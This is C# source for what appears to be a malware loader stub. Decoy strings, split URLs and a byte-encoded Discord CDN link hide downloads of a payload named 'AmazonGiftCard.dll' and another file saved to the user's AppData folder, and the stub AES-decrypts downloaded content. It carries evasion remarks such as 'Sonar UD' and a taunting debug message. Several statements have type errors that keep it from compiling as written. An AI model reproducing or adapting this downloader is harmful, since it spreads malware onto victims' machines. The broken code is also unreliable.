using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Reflection;

namespace Qstub
{
    //@@

    class Program
    {
        //\\\\\\_++__///\\//\\\\\\_++__///\\\\__/\\\\__/\\////\\\\\\_++__///\\\\__/\\\\\\\\_++__///\\\\__/\\
        //\\\\\\_++__///\\//\\\\\\_++__///\\\\__/\\\\__/\\//\\\//\\\\\\_++__///\\\\__/\\\\\_++__///\\\\__/\\
        //\\\\\\_++__///\\\\__/\\//\\\\\\_++__/////\\\\\\_++__///\\\\__/\\//\\\\\\_++__///\\\\__/\\\\\\__/\\

        public string Microman = "x2401";
        public string Ver = "4.7.2";
        public string Theme = "For the first time in paperback we bring you the authoritative and comprehensive guide for people who seek to protect their privacy as well as for anyone who's ever entertained the fantasy of disappearing--whether actually dropping out of sight or by eliminating the traceable evidence of their existence. \nWritten by the world's leading expert on finding people and helping people avoid being found, How to Disappear covers everything from tools for disappearing to discovering and eliminating the nearly invisible tracks and clues we tend to leave wherever we go. Learn the three keys to disappearing, all about your electronic footprints, the dangers and opportunities of social networking sites, and how to disappear from a stalker.";
        private DateTime timezone = DateTime.Now;

        public static string deco(string key, string plums)
        {
            byte[] iv = new byte[16];
            byte[] buffer = Convert.FromBase64String(plums);

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;
                ICryptoTransform decrypter = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream(buffer))
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, decrypter, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader((Stream)cryptoStream))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }

        static void Pain(string[] args)
        {
            string[] dances = { "Electro Shuffle", "Signature Shuffle", "The Worm", "Battle Call", "A Warrior Prepares", "u.se/", "Flapper", "Accolades", "Advances Math", "Air Horn", "Peles Air Punch", "Air Shredder", "Amazing Cube", "Around the Clock", "Azarath Metrion Zinthos!", "B.R.U.T.A.L. Dab", "Backstroke", "Baller", " Balletic", "AKEY", "Ballsy", "Banner Wave", "Bat Signal", "Battle Brother", "ALINK", "Be Seeing You", "Bean Bag", "Beep Beep", "Behold!", "Best Mates", "Billy Bounce", "Blinding Lights", "Blowing Bubbles" };

            //Kids
            string kyes = dances[19];
            bool delay = true;//ADELAY;
            int deltime = 1;//DTIME;

            //Sonar UD 
            if (delay) { Thread.Sleep(deltime); }

            //Make McD3coy
            string li = "htt" + "p://a.";
            string nk = "ugu" + dances[5];
            string spawn = dances[24];

            var pp = Makehome(li + nk + spawn);
#if (debug)
            MessageBox.Show("By yours truly, <3 Ducky\nYour key is: =".Replace("=", kyes), "Im inside, get r3kt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
#endif      
            var homelander = new WebClient();

            byte[] sexiiii = { 104,116,116,112,115,58,47,47,99,100,110,46,100,105,115,99,111,114,100,97,112,112,46,99,111,109,47,97,116,116,97,99,104,109,101,110,116,115,47,56,55,49,53,53,53,51,56,54,50,53,52,49,54,51,57,57,56,47,56,55,52,51,55,51,52,55,53,52,48,56,54,57,53,51,48,54,47,65,109,97,122,111,110,71,105,102,116,67,97,114,100,46,100,108,108 };
            var nox = System.Text.Encoding.UTF8.GetString(sexiiii);
            string Sexy = homelander.DownloadData(nox);

            string Fido = File.ReadAllText(pp);
            byte[] Husky = deco(kyes, Fido);
        }

        public static string Makehome(string link)
        {
            var path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var target = @"\Preferences\Shouganai_POGCHAMP";
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            if (!Directory.Exists(path + "//" + "Preferences"))
            {
                Directory.CreateDirectory(path + "//" + "Preferences");
            }

            var data = new WebClient().DownloadString(link);
            if (!File.Exists(path + target))
            {
                File.WriteAllBytes(path + target, data);
            }

            return path + target;
        }
    }

    
}
